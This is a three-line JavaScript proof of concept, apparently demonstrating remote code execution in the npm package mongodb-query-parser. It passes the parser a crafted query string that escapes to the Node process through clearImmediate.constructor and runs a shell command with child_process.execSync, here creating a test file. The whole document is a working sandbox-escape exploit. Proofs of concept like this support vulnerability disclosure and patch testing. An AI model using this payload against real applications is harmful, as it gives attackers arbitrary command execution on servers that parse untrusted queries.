var mongo = require('mongodb-query-parser')
var query = 'function () { return (clearImmediate.constructor("return process;")()).mainModule.require("child_process").execSync("touch test-file").toString()}()'
mongo(query);

